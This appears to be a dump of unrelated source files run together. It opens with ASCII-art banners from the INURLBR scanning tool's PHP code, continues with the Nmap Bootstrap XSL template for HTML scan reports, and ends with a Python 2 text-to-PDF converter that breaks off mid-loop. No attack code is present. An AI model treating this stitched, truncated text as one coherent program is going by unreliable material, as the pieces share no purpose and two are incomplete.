`-'`-' `-'`-----'`-' `-'`----'`----' `-' `-' 
     ", "{$_SESSION["c1"]}
 ___ _   _ _   _ ____  _     ____  ____  
|_ _| \ | | | | |  _ \| |   | __ )|  _ \ 
 | ||  \| | | | | |_) | |   |  _ \| |_) |
 | || |\  | |_| |  _ <| |___| |_) |  _ < 
|___|_| \_|\___/|_| \_\_____|____/|_| \_\
", "{$_SESSION["c1"]}
                                     /~\
                                    |oo )      /INURLBR
                                    _\=/_
                    ___        #   /  _  \   #
                   /() \        \\//|/.\|\\//
                 _|_____|_       \/  \_/  \/
                | | === | |         |\ /|
                |_|  O  |_|         \_ _/
                 ||  O  ||          | | |
                 ||__*__||          | | |
                |~ \___/ ~|         []|[]
                /=\ /=\ /=\         | | |
________________[_]_[_]_[_]________/_]_[_\_________________________
", "{$_SESSION["c1"]}
 ______   __  __  __  __  ____    __       ____     ____       
/\__  _\ /\ \/\ \/\ \/\ \/\  _`\ /\ \     /\  _`\  /\  _`\     
\/_/\ \/ \ \ `\\ \ \ \ \ \ \ \L\ \ \ \    \ \ \L\ \\ \ \L\ \   
   \ \ \  \ \ , ` \ \ \ \ \ \ ,  /\ \ \  __\ \  _ <'\ \ ,  /   
    \_\ \__\ \ \`\ \ \ \_\ \ \ \\ \\ \ \L\ \\ \ \L\ \\ \ \\ \  
    /\_____\\ \_\ \_\ \_____\ \_\ \_\ \____/ \ \____/ \ \_\ \_\
    \/_____/ \/_/\/_/\/_____/\/_/\/ /\/___/   \/___/   \/_/\/ /
", "{$_SESSION["c1"]}
 _____ ______  _     _ ______  _       ______ ______  
(_____)  ___ \| |   | (_____ \| |     (____  (_____ \ 
   _  | |   | | |   | |_____) ) |      ____)  )____) )
  | | | |   | | |   | (_____ (| |     |  __  (_____ ( 
 _| |_| |   | | |___| |     | | |_____| |__)  )    | |
(_____)_|   |_|\______|     |_|_______)______/     |_|
", "{$_SESSION["c1"]}
                           ______                                  
                        .-.      .-.                               
                       /            \                              
                      |  [ INURLBR ] |                             
                      |,  .-.  .-.  ,|                             
                      | )(|_/  \|_)( |                             
                      |/     /\     \|                             
              _       (_     ^^     _)                             
      _\ ____) \_______\__|IIIIII|__/_______________________________     
     (_)[___]{}<________|-\IIIIII/-|__INURL__INURL__INURL___________\    
       /     )_/        \          /                               
                         \ ______ / 
", "{$_SESSION["c1"]}
    
88 88b 88 88   88 88**Yb 88     88**Yb 88**Yb
88 88Yb88 88   88 88__dP 88     88__dP 88__dP
88 88 Y88 Y8   8P 88*Yb  88  .o 88**Yb 88*Yb 
88 88  Y8 `YbodP' 88  Yb 88ood8 88oodP 88  Yb
", "{$_SESSION["c1"]}
    
       #                                                
       ##                        ###                    
   ### ###  ##  ###  ##  ####### ###     ####### ####### 
   ### #### ##  ###  ##       ## ###          ##      ##
   ### #######  ###  ##  ######  ###     ######  ###### 
   ### ### ###  ###  ##  ##  ##  ###     ###  ## ##  ## 
   ### ###  ##   #####   ##   ## ####### ######  ##   ##
             #     
", "{$_SESSION["c1"]}
    
 __    __   __    __   _______  __      __    __   __    __   _______  __  
|  |  |  | |  |  |  | |   ____||  |    |  |  |  | |  |  |  | |   ____||  | 
|  |__|  | |  |  |  | |  |__   |  |    |  |__|  | |  |  |  | |  |__   |  | 
|   __   | |  |  |  | |   __|  |  |    |   __   | |  |  |  | |   __|  |  | 
|  |  |  | |  `--'  | |  |____ |__|    |  |  |  | |  `--'  | |  |____ |__| 
|__|  |__|  \______/  |_______|(__)    |__|  |__|  \______/  |_______|(__)                                                                          
", "{$_SESSION["c1"]}
 _            _          
| |__  _ __  | |__  _ __ 
| '_ \| '__| | '_ \| '__|
| |_) | |    | |_) | |   
|_.__/|_|    |_.__/|_| 
", "{$_SESSION["c1"]}
     ___      .__   __. .___________. __   _______    ___      
    /   \     |  \ |  | |           ||  | |   ____|  /   \     
   /  ^  \    |   \|  | `---|  |----`|  | |  |__    /  ^  \    
  /  /_\  \   |  . `  |     |  |     |  | |   __|  /  /_\  \   
 /  _____  \  |  |\   |     |  |     |  | |  |    /  _____  \  
/__/     \__\ |__| \__|     |__|     |__| |__|   /__/     \__\                                                              
", "{$_SESSION["c1"]}
 _____       _                       _           
/  ___|     | |                     (_)          
\ `--. _   _| |____   _____ _ __ ___ ___   _____ 
 `--. \ | | | '_ \ \ / / _ \ '__/ __| \ \ / / _ \
/\__/ / |_| | |_) \ V /  __/ |  \__ \ |\ V /  __/
\____/ \__,_|_.__/ \_/ \___|_|  |___/_| \_/ \___|

", "{$_SESSION["c1"]}
 __     __              _       _ _                       ____  _       _ _        _ 
 \ \   / /_ _ _ __   __| | __ _| (_)___ _ __ ___   ___   |  _ \(_) __ _(_) |_ __ _| |
  \ \ / / _` | '_ \ / _` |/ _` | | / __| '_ ` _ \ / _ \  | | | | |/ _` | | __/ _` | |
   \ V / (_| | | | | (_| | (_| | | \__ \ | | | | | (_) | | |_| | | (_| | | || (_| | |
    \_/ \__,_|_| |_|\__,_|\__,_|_|_|___/_| |_| |_|\___/  |____/|_|\__, |_|\__\__,_|_|
                                                                  |___/              
");
    return ($banners[rand(0, count($banners) - 1)]);
}

<?xml version="1.0" encoding="utf-8"?>
<!--
Nmap Bootstrap XSL
Creative Commons BY-SA
Andreas Hontzia (@honze_net)
-->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" encoding="utf-8" indent="yes" doctype-system="about:legacy-compat"/>
  <xsl:template match="/">
    <html lang="en">
      <head>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"/>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous"/>
        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.19/css/dataTables.bootstrap.min.css"/>
        <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
        <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
        <style>
          .target:before {
            content: "";
            display: block;
            height: 50px;
            margin: -20px 0 0;
          }
          @media only screen and (min-width:1900px) {
            .container {
              width: 1800px;
              }
          }
          .footer {
            margin-top:60px;
            padding-top:60px;
            width: 100%;
            height: 180px;
            background-color: #f5f5f5;
          }
        </style>
        <title>Scan Report Nmap <xsl:value-of select="/nmaprun/@version"/></title>
      </head>
      <body>
        <nav class="navbar navbar-default navbar-fixed-top">
          <div class="container-fluid">
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
              <a class="navbar-brand" href="#"><span class="glyphicon glyphicon-home"></span></a>
            </div>
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
              <ul class="nav navbar-nav">
                <li><a href="#scannedhosts">Scanned Hosts</a></li>
                <li><a href="#onlinehosts">Online Hosts</a></li>
                <li><a href="#openservices">Open Services</a></li>
              </ul>
            </div>
          </div>
        </nav>
        <div class="container">
          <div class="jumbotron">
            <h1>Scan Report<br/><small>Nmap <xsl:value-of select="/nmaprun/@version"/></small></h1>
            <pre style="white-space:pre-wrap; word-wrap:break-word;"><xsl:value-of select="/nmaprun/@args"/></pre>
            <p class="lead">
              <xsl:value-of select="/nmaprun/@startstr"/> – <xsl:value-of select="/nmaprun/runstats/finished/@timestr"/><br/>
              <xsl:value-of select="/nmaprun/runstats/hosts/@total"/> hosts scanned.
              <xsl:value-of select="/nmaprun/runstats/hosts/@up"/> hosts up.
              <xsl:value-of select="/nmaprun/runstats/hosts/@down"/> hosts down.
            </p>
            <div class="progress">
              <div class="progress-bar progress-bar-success" style="width: 0%">
                <xsl:attribute name="style">width:<xsl:value-of select="/nmaprun/runstats/hosts/@up div /nmaprun/runstats/hosts/@total * 100"/>%;</xsl:attribute>
                <xsl:value-of select="/nmaprun/runstats/hosts/@up"/>
                <span class="sr-only"></span>
              </div>
              <div class="progress-bar progress-bar-danger" style="width: 0%">
                <xsl:attribute name="style">width:<xsl:value-of select="/nmaprun/runstats/hosts/@down div /nmaprun/runstats/hosts/@total * 100"/>%;</xsl:attribute>
                <xsl:value-of select="/nmaprun/runstats/hosts/@down"/>
                <span class="sr-only"></span>
              </div>
            </div>
          </div>
          <h2 id="scannedhosts" class="target">Scanned Hosts<xsl:if test="/nmaprun/runstats/hosts/@down > 1024"><small> (offline hosts are hidden)</small></xsl:if></h2>
          <div class="table-responsive">
            <table id="table-overview" class="table table-striped dataTable" role="grid">
              <thead>
                <tr>
                  <th>State</th>
                  <th>Address</th>
                  <th>Hostname</th>
                  <th>TCP (open)</th>
                  <th>UDP (open)</th>
                </tr>
              </thead>
              <tbody>
                <xsl:choose>
                  <xsl:when test="/nmaprun/runstats/hosts/@down > 1024">
                    <xsl:for-each select="/nmaprun/host[status/@state='up']">
                      <tr>
                        <td><span class="label label-danger"><xsl:if test="status/@state='up'"><xsl:attribute name="class">label label-success</xsl:attribute></xsl:if><xsl:value-of select="status/@state"/></span></td>
                        <td><xsl:value-of select="address/@addr"/></td>
                        <td><xsl:value-of select="hostnames/hostname/@name"/></td>
                        <td><xsl:value-of select="count(ports/port[state/@state='open' and @protocol='tcp'])"/></td>
                        <td><xsl:value-of select="count(ports/port[state/@state='open' and @protocol='udp'])"/></td>
                      </tr>
                    </xsl:for-each>
                  </xsl:when>
                  <xsl:otherwise>
                    <xsl:for-each select="/nmaprun/host">
                      <tr>
                        <td><span class="label label-danger"><xsl:if test="status/@state='up'"><xsl:attribute name="class">label label-success</xsl:attribute></xsl:if><xsl:value-of select="status/@state"/></span></td>
                        <td><xsl:value-of select="address/@addr"/></td>
                        <td><xsl:value-of select="hostnames/hostname/@name"/></td>
                        <td><xsl:value-of select="count(ports/port[state/@state='open' and @protocol='tcp'])"/></td>
                        <td><xsl:value-of select="count(ports/port[state/@state='open' and @protocol='udp'])"/></td>
                      </tr>
                    </xsl:for-each>
                  </xsl:otherwise>
                </xsl:choose>
              </tbody>
            </table>
          </div>
          <script>
            $(document).ready(function() {
              $('#table-overview').DataTable();
            });
          </script>
          <h2 id="onlinehosts" class="target">Online Hosts</h2>
          <xsl:for-each select="/nmaprun/host[status/@state='up']">
            <div class="panel panel-default">
              <div class="panel-heading">
                <h3 class="panel-title"><xsl:value-of select="address/@addr"/><xsl:if test="count(hostnames/hostname) > 0"> - <xsl:value-of select="hostnames/hostname/@name"/></xsl:if></h3>
              </div>
              <div class="panel-body">
                <xsl:if test="count(hostnames/hostname) > 0">
                  <h4>Hostnames</h4>
                  <ul>
                    <xsl:for-each select="hostnames/hostname">
                      <li><xsl:value-of select="@name"/> (<xsl:value-of select="@type"/>)</li>
                    </xsl:for-each>
                  </ul>
                </xsl:if>
                <h4>Ports</h4>
                <div class="table-responsive">
                  <table class="table table-bordered">
                    <thead>
                      <tr>
                        <th>Port</th>
                        <th>Protocol</th>
                        <th>State<br/>Reason</th>
                        <th>Service</th>
                        <th>Product</th>
                        <th>Version</th>
                        <th>Extra Info</th>
                      </tr>
                    </thead>
                    <tbody>
                      <xsl:for-each select="ports/port">
                        <xsl:choose>
                          <xsl:when test="state/@state = 'open'">
                            <tr class="success">
                              <td title="Port"><xsl:value-of select="@portid"/></td>
                              <td title="Protocol"><xsl:value-of select="@protocol"/></td>
                              <td title="State / Reason"><xsl:value-of select="state/@state"/><br/><xsl:value-of select="state/@reason"/></td>
                              <td title="Service"><xsl:value-of select="service/@name"/></td>
                              <td title="Product"><xsl:value-of select="service/@product"/></td>
                              <td title="Version"><xsl:value-of select="service/@version"/></td>
                              <td title="Extra Info"><xsl:value-of select="service/@extrainfo"/></td>
                            </tr>
                            <tr>
                              <td colspan="7">
                                <a><xsl:attribute name="href">https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;cves=on&amp;cpe_version=<xsl:value-of select="service/cpe"/></xsl:attribute><xsl:value-of select="service/cpe"/></a>
                                <xsl:for-each select="script">
                                  <h5><xsl:value-of select="@id"/></h5>
                                  <pre style="white-space:pre-wrap; word-wrap:break-word;"><xsl:value-of select="@output"/></pre>
                                </xsl:for-each>
                              </td>
                            </tr>
                          </xsl:when>
                          <xsl:when test="state/@state = 'filtered'">
                            <tr class="warning">
                              <td><xsl:value-of select="@portid"/></td>
                              <td><xsl:value-of select="@protocol"/></td>
                              <td><xsl:value-of select="state/@state"/><br/><xsl:value-of select="state/@reason"/></td>
                              <td><xsl:value-of select="service/@name"/></td>
                              <td><xsl:value-of select="service/@product"/></td>
                              <td><xsl:value-of select="service/@version"/></td>
                              <td><xsl:value-of select="service/@extrainfo"/></td>
                            </tr>
                          </xsl:when>
                          <xsl:when test="state/@state = 'closed'">
                            <tr class="active">
                              <td><xsl:value-of select="@portid"/></td>
                              <td><xsl:value-of select="@protocol"/></td>
                              <td><xsl:value-of select="state/@state"/><br/><xsl:value-of select="state/@reason"/></td>
                              <td><xsl:value-of select="service/@name"/></td>
                              <td><xsl:value-of select="service/@product"/></td>
                              <td><xsl:value-of select="service/@version"/></td>
                              <td><xsl:value-of select="service/@extrainfo"/></td>
                            </tr>
                          </xsl:when>
                          <xsl:otherwise>
                            <tr class="info">
                              <td><xsl:value-of select="@portid"/></td>
                              <td><xsl:value-of select="@protocol"/></td>
                              <td><xsl:value-of select="state/@state"/><br/><xsl:value-of select="state/@reason"/></td>
                              <td><xsl:value-of select="service/@name"/></td>
                              <td><xsl:value-of select="service/@product"/></td>
                              <td><xsl:value-of select="service/@version"/></td>
                              <td><xsl:value-of select="service/@extrainfo"/></td>
                            </tr>
                          </xsl:otherwise>
                        </xsl:choose>
                      </xsl:for-each>
                    </tbody>
                  </table>
                </div>
                <xsl:if test="count(hostscript/script) > 0">
                  <h4>Host Script</h4>
                </xsl:if>
                <xsl:for-each select="hostscript/script">
                  <h5><xsl:value-of select="@id"/></h5>
                  <pre style="white-space:pre-wrap; word-wrap:break-word;"><xsl:value-of select="@output"/></pre>
                </xsl:for-each>
              </div>
            </div>
          </xsl:for-each>
          <h2 id="openservices" class="target">Open Services</h2>
          <div class="table-responsive">
            <table id="table-services" class="table table-striped dataTable" role="grid">
              <thead>
                <tr>
                  <th>Address</th>
                  <th>Port</th>
                  <th>Protocol</th>
                  <th>Service</th>
                  <th>Product</th>
                  <th>Version</th>
                  <th>CPE</th>
                  <th>Extra info</th>
                </tr>
              </thead>
              <tbody>
                <xsl:for-each select="/nmaprun/host">
                  <xsl:for-each select="ports/port[state/@state='open']">
                    <tr>
                      <td><xsl:value-of select="../../address/@addr"/><xsl:if test="count(../../hostnames/hostname) > 0"> - <xsl:value-of select="../../hostnames/hostname/@name"/></xsl:if></td>
                      <td><xsl:value-of select="@portid"/></td>
                      <td><xsl:value-of select="@protocol"/></td>
                      <td><xsl:value-of select="service/@name"/></td>
                      <td><xsl:value-of select="service/@product"/></td>
                      <td><xsl:value-of select="service/@version"/></td>
                      <td><xsl:value-of select="service/cpe"/></td>
                      <td><xsl:value-of select="service/@extrainfo"/></td>
                    </tr>
                  </xsl:for-each>
                </xsl:for-each>
              </tbody>
            </table>
          </div>
          <script>
            $(document).ready(function() {
              $('#table-services').DataTable();
            });
          </script>
        </div>
        <footer class="footer">
          <div class="container">
            <p class="text-muted">
              This report was generated with <a href="https://github.com/honze-net/nmap-bootstrap-xsl">Nmap Bootstrap XSL</a>.<br/>
              Licensed under <a href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons BY-SA</a>.<br/>
              Designed and built by Andreas Hontzia (<a href="https://www.twitter.com/honze_net">@honze_net</a>).<br/>
            </p>
          </div>
        </footer>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>

#! /usr/bin/env python
"""
 pyText2Pdf - Python script to convert plain text files into Adobe
 Acrobat PDF files with support for arbitrary page breaks etc.

 Version 2.0

 Author: Anand B Pillai <abpillai at gmail dot com>
    
"""

# Derived from http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/189858

import sys, os
import string
import time
import optparse
import re

LF_EXTRA=0
LINE_END='\015'
# form feed character (^L)
FF=chr(12)

ENCODING_STR = """\
/Encoding <<
/Differences [ 0 /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /space /exclam
/quotedbl /numbersign /dollar /percent /ampersand
/quoteright /parenleft /parenright /asterisk /plus /comma
/hyphen /period /slash /zero /one /two /three /four /five
/six /seven /eight /nine /colon /semicolon /less /equal
/greater /question /at /A /B /C /D /E /F /G /H /I /J /K /L
/M /N /O /P /Q /R /S /T /U /V /W /X /Y /Z /bracketleft
/backslash /bracketright /asciicircum /underscore
/quoteleft /a /b /c /d /e /f /g /h /i /j /k /l /m /n /o /p
/q /r /s /t /u /v /w /x /y /z /braceleft /bar /braceright
/asciitilde /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/dotlessi /grave /acute /circumflex /tilde /macron /breve
/dotaccent /dieresis /.notdef /ring /cedilla /.notdef
/hungarumlaut /ogonek /caron /space /exclamdown /cent
/sterling /currency /yen /brokenbar /section /dieresis
/copyright /ordfeminine /guillemotleft /logicalnot /hyphen
/registered /macron /degree /plusminus /twosuperior
/threesuperior /acute /mu /paragraph /periodcentered
/cedilla /onesuperior /ordmasculine /guillemotright
/onequarter /onehalf /threequarters /questiondown /Agrave
/Aacute /Acircumflex /Atilde /Adieresis /Aring /AE
/Ccedilla /Egrave /Eacute /Ecircumflex /Edieresis /Igrave
/Iacute /Icircumflex /Idieresis /Eth /Ntilde /Ograve
/Oacute /Ocircumflex /Otilde /Odieresis /multiply /Oslash
/Ugrave /Uacute /Ucircumflex /Udieresis /Yacute /Thorn
/germandbls /agrave /aacute /acircumflex /atilde /adieresis
/aring /ae /ccedilla /egrave /eacute /ecircumflex
/edieresis /igrave /iacute /icircumflex /idieresis /eth
/ntilde /ograve /oacute /ocircumflex /otilde /odieresis
/divide /oslash /ugrave /uacute /ucircumflex /udieresis
/yacute /thorn /ydieresis ]
>>
"""

INTRO="""\
%prog [options] filename

PyText2Pdf  makes a 7-bit clean PDF file from any input file.

It reads from a named file, and writes the PDF file to a file specified by
the user, otherwise to a file with '.pdf' appended to the input file.

Author: Anand B Pillai."""


class PyText2Pdf(object):
    """ Text2pdf converter in pure Python """
    
    def __init__(self):
        # version number
        self._version="1.3"
        # iso encoding flag
        self._IsoEnc=False
        # formfeeds flag
        self._doFFs=False
        self._progname="PyText2Pdf"
        self._appname = " ".join((self._progname,str(self._version)))
        # default font
        self._font="/Courier"
        # default font size
        self._ptSize=10
        # default vert space
        self._vertSpace=12
        self._lines=0
        # number of characters in a row
        self._cols=80
        self._columns=1
        # page ht
        self._pageHt=792
        # page wd
        self._pageWd=612
        # input file 
        self._ifile=""
        # output file 
        self._ofile=""
        # default tab width
        self._tab=4
        # input file descriptor
        self._ifs=None
        # output file descriptor
        self._ofs=None
        # landscape flag
        self._landscape=False
        # Subject
        self._subject = ''
        # Author
        self._author = ''
        # Keywords
        self._keywords = []
        # Custom regexp  for page breaks
        self._pagebreakre = None
        
        # marker objects
        self._curobj = 5
        self._pageObs = [0]
        self._locations = [0,0,0,0,0,0]
        self._pageNo=0

        # file position marker
        self._fpos=0

    def parse_args(self):
        
        """ Callback function called by argument parser.
        Helps to remove duplicate code """

        if len(sys.argv)<2:
            sys.argv.append('-h')
            
        parser = optparse.OptionParser(usage=INTRO)
        parser.add_option('-o','--output',dest='outfile',help='Direct output to file OUTFILE',metavar='OUTFILE')
        parser.add_option('-f','--font',dest='font',help='Use Postscript font FONT (must be in standard 14, default: Courier)',
                          default='Courier')
        parser.add_option('-I','--isolatin',dest='isolatin',help='Use ISO latin-1 encoding',default=False,action='store_true')
        parser.add_option('-s','--size',dest='fontsize',help='Use font at PTSIZE points (default=>10)',metavar='PTSIZE',default=10)
        parser.add_option('-v','--linespace',dest='linespace',help='Use line spacing LINESPACE (deault 12)',metavar='LINESPACE',default=12)
        parser.add_option('-l','--lines',dest='lines',help='Lines per page (default 60, determined automatically if unspecified)',default=60, metavar=None)
        parser.add_option('-c','--chars',dest='chars',help='Maximum characters per line (default 80)',default=80,metavar=None)
        parser.add_option('-t','--tab',dest='tabspace',help='Spaces per tab character (default 4)',default=4,metavar=None)
        parser.add_option('-F','--ignoreff',dest='formfeed',help='Ignore formfeed character ^L (i.e, accept formfeed characters as pagebreaks)',default=False,action='store_true')
        parser.add_option('-P','--papersize',dest='papersize',help='Set paper size (default is letter, accepted values are "A4" or "A3")')
        parser.add_option('-W','--width',dest='width',help='Independent paper width in points',metavar=None,default=612)
        parser.add_option('-H','--height',dest='height',help='Independent paper height in points',metavar=None,default=792)
        parser.add_option('-2','--twocolumns',dest='twocolumns',help='Format as two columns',metavar=None,default=False,action='store_true')
        parser.add_option('-L','--landscape',dest='landscape',help='Format in landscape mode',metavar=None,default=False,action='store_true')
        parser.add_option('-R','--regexp',dest='pageregexp',help='Regular expression string to determine page breaks (if supplied, this will be used to split text into pages, instead of using line count)',metavar=None)
        parser.add_option('-S','--subject',dest='subject',help='Optional subject for the document',metavar=None)
        parser.add_option('-A','--author',dest='author',help='Optional author for the document',metavar=None)
        parser.add_option('-K','--keywords',dest='keywords',help='Optional list of keywords for the document (separated by commas)',metavar=None)
        

        optlist, args = parser.parse_args()
        # print optlist.__dict__, args

        if len(args)==0:
            sys.exit('Error: input file argument missing')
        elif len(args)>1:
            sys.exit('Error: Too many arguments')            

        self._ifile = args[0]
        
        d = optlist.__dict__
        if d.get('isolatin'): self._IsoEnc=True
        if d.get('formfeed'): self._doFFs = True
        if d.get('twocolumns'): self._columns = 2
        if d.get('landscape'): self._landscape = True

        self._font = '/' + d.get('font')
        psize = d.get('papersize')
        if psize=='A4':
            self._pageWd=595
            self._pageHt=842
        elif psize=='A3':
            self._pageWd=842
            self._pageHt=1190

        fsize = int(d.get('fontsize'))
        if fsize < 1: fsize = 1
        self._ptSize = fsize

        lspace = int(d.get('linespace'))
        if lspace<1: lspace = 1
        self._vertSpace = lspace

        lines = int(d.get('lines'))
        if lines<1: lines = 1
        self._lines = int(lines)

        chars = int(d.get('chars'))
        if chars<4: chars = 4
        self._cols = chars

        tab = int(d.get('tabspace'))
        if tab<1: tab = 1
        self._tab = tab

        w = int(d.get('width'))
        if w<72: w=72
        self._pageWd = w

        h = int(d.get('height'))
        if h<72: h=72
        self._pageHt = h

        # Very optional args
        author = d.get('author')
        if author: self._author = author

        subject = d.get('subject')
        if subject: self._subject = subject

        keywords = d.get('keywords')
        if keywords:
            self._keywords = keywords.split(',')

        pagebreak = d.get('pageregexp')
        if pagebreak:
            self._pagebreakre = re.compile(pagebreak, re.UNICODE|re.IGNORECASE)
        
        outfile = d.get('outfile')
        if outfile: self._ofile = outfile
        
        if self._landscape:
            print 'Landscape option on...'
        if self._columns==2:
            print 'Printing in two columns...'
        if self._doFFs:
            print 'Ignoring form feed character...'
        if self._IsoEnc:
            print 'Using ISO Latin Encoding...'

        print 'Using font',self._font[1:],'size =', self._ptSize

    def writestr(self, str):
        """ Write string to output file descriptor.
        All output operations go through this function.
        We keep the current file position also here"""

        # update current file position
        self._fpos += len(str)
        for x in range(0, len(str)):
            if str[x] == '\n':
                self._fpos += LF_EXTRA
        try:
            self._ofs.write(str)
        except IOError, e:
            print e
            return -1

        return 0
            
    def convert(self):
        """ Perform the actual conversion """
    
        if self._landscape:
            # swap page width & height
            tmp = self._pageHt
            self._pageHt = self._pageWd
            self._pageWd = tmp

        if self._lines==0:
            self._lines = (self._pageHt - 72)/self._vertSpace
        if self._lines < 1:
            self._lines=1
        
        try:
            self._ifs=open(self._ifile)
        except IOError, (strerror, errno):
            print 'Error: Could not open file to read --->', self._ifile
            sys.exit(3)

        if self._ofile=="":
            self._ofile = os.path.splitext(self._ifile)[0] + '.pdf'

        try:
            self._ofs = open(self._ofile, 'wb')
        except IOError, (strerror, errno):
            print 'Error: Could not open file to write --->', self._ofile
            sys.exit(3)

        print 'Input file=>',self._ifile
        print 'Writing pdf file',self._ofile, '...'
        self.writeheader()
        self.writepages()
        self.writerest()

        print 'Wrote file', self._ofile
        self._ifs.close()
        self._ofs.close()
        return 0

    def writeheader(self):
        """Write the PDF header"""

        ws = self.writestr

        title = self._ifile
        
        t=time.localtime()
        timestr=str(time.strftime("D:%Y%m%d%H%M%S", t))
        ws("%PDF-1.4\n")
        self._locations[1] = self._fpos
        ws("1 0 obj\n")
        ws("<<\n")

        buf = "".join(("/Creator (", self._appname, " By Anand B Pillai )\n"))
        ws(buf)
        buf = "".join(("/CreationDate (", timestr, ")\n"))
        ws(buf)
        buf = "".join(("/Producer (", self._appname, "(\\251 Anand B Pillai))\n"))
        ws(buf)
        if self._subject:
            title = self._subject
            buf = "".join(("/Subject (",self._subject,")\n"))
            ws(buf)
        if self._author:
            buf = "".join(("/Author (",self._author,")\n"))
            ws(buf)
        if self._keywords:
            buf = "".join(("/Keywords (",' '.join(self._keywords),")\n"))
            ws(buf)

        if title:
            buf = "".join(("/Title (", title, ")\n"))
            ws(buf)

        ws(">>\n")
        ws("endobj\n")
    
        self._locations[2] = self._fpos

        ws("2 0 obj\n")
        ws("<<\n")
        ws("/Type /Catalog\n")
        ws("/Pages 3 0 R\n")
        ws(">>\n")
        ws("endobj\n")
        
        self._locations[4] = self._fpos
        ws("4 0 obj\n")
        ws("<<\n")
        buf = "".join(("/BaseFont ", str(self._font), " /Encoding /WinAnsiEncoding /Name /F1 /Subtype /Type1 /Type /Font >>\n"))
        ws(buf)
    
        if self._IsoEnc:
            ws(ENCODING_STR)
            
        ws(">>\n")
        ws("endobj\n")
        
        self._locations[5] = self._fpos
        
        ws("5 0 obj\n")
        ws("<<\n")
        ws("  /Font << /F1 4 0 R >>\n")
        ws("  /ProcSet [ /PDF /Text ]\n")
        ws(">>\n")
        ws("endobj\n")
    
    def startpage(self):
        """ Start a page of data """

        ws = self.writestr
        
        self._pageNo += 1
        self._curobj += 1

        self._locations.append(self._fpos)
        self._locations[self._curobj]=self._fpos
    
        self._pageObs.append(self._curobj)
        self._pageObs[self._pageNo] = self._curobj
        
        buf = "".join((str(self._curobj), " 0 obj\n"))

        ws(buf)
        ws("<<\n")
        ws("/Type /Page\n")
        ws("/Parent 3 0 R\n")
        ws("/Resources 5 0 R\n")

        self._curobj += 1
        buf = "".join(("/Contents ", str(self._curobj), " 0 R\n"))
        ws(buf)
        ws(">>\n")
        ws("endobj\n")
        
        self._locations.append(self._fpos)
        self._locations[self._curobj] = self._fpos

        buf = "".join((str(self._curobj), " 0 obj\n"))
        ws(buf)
        ws("<<\n")
        
        buf = "".join(("/Length ", str(self._curobj + 1), " 0 R\n"))
        ws(buf)
        ws(">>\n")
        ws("stream\n")
        strmPos = self._fpos
    
        ws("BT\n");
        buf = "".join(("/F1 ", str(self._ptSize), " Tf\n"))
        ws(buf)
        buf = "".join(("1 0 0 1 50 ", str(self._pageHt - 40), " Tm\n"))
        ws(buf)
        buf = "".join((str(self._vertSpace), " TL\n"))
        ws(buf)
    
        return strmPos

    def endpage(self, streamStart):
        """End a page of data """
        
        ws = self.writestr

        ws("ET\n")
        streamEnd = self._fpos
        ws("endstream\n")
        ws("endobj\n")
    
        self._curobj += 1
        self._locations.append(self._fpos)
        self._locations[self._curobj] = self._fpos
    
        buf = "".join((str(self._curobj), " 0 obj\n"))
        ws(buf)
        buf = "".join((str(streamEnd - streamStart), '\n'))
        ws(buf)
        ws('endobj\n')
    
    def writepages(self):
        """Write pages as PDF"""
        
        ws = self.writestr

        beginstream=0
        lineNo, charNo=0,0
        ch, column=0,0
        padding,i=0,0
        atEOF=0
        linebuf = ''
        
        while not atEOF:
            beginstream = self.startpage()
            column=1
            
            while column <= self._columns:
                column += 1
                atFF=0
                atBOP=0
                lineNo=0
                # Special flag for regexp page break
                pagebreak = False
                
                while lineNo < self._lines and not atFF and not atEOF and not pagebreak:
                    linebuf = ''
                    lineNo += 1
                    ws("(")
                    charNo=0
                    
                    while charNo < self._cols:
                        charNo += 1
                        ch = self._ifs.read(1)
                        cond = ((ch != '\n') and not(ch==FF and self._doFFs) and (ch != ''))
                        if not cond:
                            # See if this dude matches the pagebreak regexp
                            if self._pagebreakre and self._pagebreakre.search(linebuf.strip()):
                                pagebreak = True
                                
                            linebuf = ''
                            break
                        else:
                            linebuf = linebuf + ch

                        if ord(ch) >= 32 and ord(ch) <= 127:
                            if ch == '(' or ch == ')' or ch == '\\':
                                ws("\\")
                            ws(ch)
                        else:
                            if ord(ch) == 9:
                                padding =self._tab - ((charNo - 1) % self._tab)
                                for i in range(padding):
                                    ws(" ")
                                charNo += (padding -1)
                            else:
                                if ch != FF:
